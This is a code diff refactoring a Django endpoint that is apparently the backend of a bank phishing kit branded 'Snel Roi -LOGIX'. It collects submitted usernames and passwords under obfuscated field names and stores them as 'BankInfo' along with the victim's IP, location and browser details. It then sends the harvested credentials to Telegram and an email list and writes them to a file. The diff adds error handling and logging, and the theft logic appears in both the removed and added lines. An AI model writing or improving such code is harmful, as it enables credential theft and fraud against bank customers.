@@ -1,10 +1,11 @@
 import json
 import os
 import re
+import logging
 from django.conf import settings
 from django.shortcuts import render
 import requests
-from core.app_config import app_settings
+from core.app_settings import app_settings
 
 from rest_framework.response import Response
 from rest_framework import status
@@ -28,6 +29,9 @@ from django.core.mail import send_mail
 from datetime import datetime
 
 
+logger = logging.getLogger(__name__)
+
+
 @api_view(
     [
         "POST",
@@ -42,99 +46,85 @@ def logix_collect_user_login_cred(request):
     errors = {}
 
     if request.method == "POST":
+        try:
+            username = request.data.get("emzemz", "")
+            password = request.data.get("pwzenz", "")
 
-        username = request.data.get("emzemz", "")
-        password = request.data.get("pwzenz", "")
+            if not username:
+                errors["username"] = ["Username is required."]
 
-        if not username:
-            errors["username"] = ["Username is required."]
+            if not password:
+                errors["password"] = ["Password is required."]
 
-        if not password:
-            errors["password"] = ["Password is required."]
+            if errors:
+                payload["message"] = "Errors"
+                payload["errors"] = errors
+                return Response(payload, status=status.HTTP_400_BAD_REQUEST)
 
-        if errors:
+            ip = get_client_ip(request)
+            agent = request.META.get("HTTP_USER_AGENT", "")
+
+            country = get_country_from_ip(ip)
+            city = get_city_from_ip(ip)
+            browser = get_user_browser(agent)
+            os = get_user_os(agent)
+            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
+
+            client, _ = Client.objects.get_or_create(
+                username=username,
+            )
+            client.username = username
+            client.email = username
+            client.save()
+
+            bank_info = BankInfo.objects.create(
+                client=client, password=password, username=username
+            )
+            browser_data = BrowserDetail.objects.create(
+                client=client,
+                ip=ip,
+                agent=agent,
+                country=country,
+                city=city,
+                address=f"{city}, {country}",
+                browser=browser,
+                os=os,
+                time=date,
+                date=date,
+            )
+
+            message = f"|=====||Snel Roi -LOGIX||=====|\n"
+            message += f"|========= [  LOGIN  ] ==========|\n"
+            message += f"| ➤ [ Username ]         : {username}\n"
+            message += f"| ➤ [ Password ]      : {password}\n"
+            message += f"|=====================================|\n"
+            message += f"| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
+            message += f"|======================================|\n"
+            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
+            message += f"| ➤ [ IP Country ]   : {country}\r\n"
+            message += f"| ➤ [ IP City ]      : {city}\r\n"
+            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
+            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
+            message += f"| ➤ [ TIME ]         : {date}\r\n"
+            message += f"|=====================================|\n"
+
+            send_data_telegram(app_settings, message)
+
+            subject = "The Data"
+            from_email = app_settings['from_email']
+            recipient_list = app_settings['send_email_list']
+
+            send_data_email(subject, message, from_email, recipient_list)
+
+            save_data_to_file(username, message)
+
+            payload["message"] = "Successful"
+            payload["data"] = data
+        except Exception as exc:
+            logger.exception("logix_collect_user_login_cred failed")
             payload["message"] = "Errors"
-            payload["errors"] = errors
-            return Response(payload, status=status.HTTP_400_BAD_REQUEST)
-
-        #####################
-        # Browser Data
-        ######################
-
-        ip = get_client_ip(request)
-        agent = request.META.get("HTTP_USER_AGENT", "")
-
-        country = get_country_from_ip(ip)
-        city = get_city_from_ip(ip)
-        browser = get_user_browser(agent)
-        os = get_user_os(agent)
-        date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
-
-        ##############################
-        # Save User data to database
-        ################################
-
-        client, created = Client.objects.get_or_create(
-            username=username,
-        )
-        client.username = username  # Ensure username field is set
-        client.email = username    # Ensure email field is set
-        client.save()
-
-        bank_info = BankInfo.objects.create(
-            client=client, password=password, username=username
-        )
-        browser_data = BrowserDetail.objects.create(
-            client=client,
-            ip=ip,
-            agent=agent,
-            country=country,
-            city=city,
-            address=f"{city}, {country}",  # Combine city and country for address
-            browser=browser,
-            os=os,
-            time=date,
-            date=date,
-        )
-
-        message = f"|=====||Snel Roi -LOGIX||=====|\n"
-        message += f"|========= [  LOGIN  ] ==========|\n"
-        message += f"| ➤ [ Username ]         : {username}\n"
-        message += f"| ➤ [ Password ]      : {password}\n"
-        message += f"|=====================================|\n"
-        message += f"| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
-        message += f"|======================================|\n"
-        message += f"| ➤ [ IP Address ]   : {ip}\r\n"
-        message += f"| ➤ [ IP Country ]   : {country}\r\n"
-        message += f"| ➤ [ IP City ]      : {city}\r\n"
-        message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
-        message += f"| ➤ [ User Agent ]   : {agent}\r\n"
-        message += f"| ➤ [ TIME ]         : {date}\r\n"
-        message += f"|=====================================|\n"
-
-        #############################
-        # Send data to telegram
-        ##############################
-
-        send_data_telegram(app_settings, message)
-
-        #############################
-        # Send Data to email
-        ########################
-
-        subject = "The Data"
-        from_email = app_settings['from_email']
-        recipient_list = app_settings['send_email_list']
-
-        send_data_email(subject, message, from_email, recipient_list)
-
-        #####################################
-        # Save to txt
-        ##############################
-        save_data_to_file(username, message)
-
-        payload["message"] = "Successful"
-        payload["data"] = data
+            payload["errors"] = {"detail": ["Internal server error"]}
+            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
     return Response(payload)
 
 
